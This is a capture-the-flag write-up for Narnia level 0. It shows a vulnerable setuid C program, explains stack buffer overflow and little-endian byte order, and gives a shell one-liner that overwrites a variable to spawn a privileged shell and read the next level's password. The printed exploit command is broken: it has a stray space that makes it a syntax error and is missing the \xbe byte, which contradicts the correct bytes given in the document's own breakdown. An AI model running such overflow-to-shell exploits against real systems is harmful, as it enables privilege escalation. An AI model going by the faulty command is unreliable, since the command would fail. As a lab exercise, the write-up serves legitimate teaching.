### Narnia level 0-1


## Problem explanation


-In Narnia0,we are given acces to a C binary at /narnia/narnia0 and its source code at /narnia/narnia0.c

-The binary runs as narnia1 due to the setuid bit,we have to exploit it to get the pivileges to read the password file in /etc/narnia_pass/narnia1

# Source Code 
    #include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}

## Background Knowledge 

# Buffers and memory

-Variables in a program live contiguosly in memory

-char buf[20] reserves exactly 20 bytes in a row.val declared before

-In memory they sit next to each other like this
    [buf(20 bytes) ] [val (4 bytes) ]

# Buffer Overflow 

-scanf("%24s", buf) reads up to 24 characters into a buffer that only holds 20

-Those 4 bytes spill over into val because it comes next in memory

# Little endian

-x86 CPUs store multi-byte numbers in reversed byte order in memory

-0xdeadbeef is stored as EF BE AD DE 

-In the exploit the bytes has to be send in that order so the CPU reads it correctly

# Magic numbers

-0xdeadbeef is a well known value used historically by programmers to mark unitialized memory or as a sentinel value in debugging

# setuid

-The binary has the setuid bit to run as ,in this case,narnia1,basically turn you into that user while you use it,similar to 'sudo'


## Solution

-The goal is to overflow buf with 20 bytes of junk,and then write 0xdeadbeef in little-endian as the next 4 bytes

-Since 0xdeadbeef contains non-printable bytes that can't be typed on a keyboard we use Python to inject raw bytes
    
   [ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b '\xef\xad\xde')"; cat) | /narnia/narnia0]

# Breaking it down
    
-b'A'*20 -- 20 bytes of junk to fill the buffer

-b'\xef\xbe\xad\xde' -- 0xdeadbeef in the little-endian,overwriting val

-; cat -- keeps stdin open so we can interact with the shell after it spawns

-| /narnia/narnia0 -- pipes everything as input to the binary

# Once the shell spawns,read the password

    cat /etc/narnia_pass/narnia1


## Key concepts learned



-Buffer overflow-- writing past the end of a buffer overwrites adjacent memory

-Stack memory layout-- local variables live next to each other on the stack

-Raw byte injection-- non-printable bytes must be injected programmatically

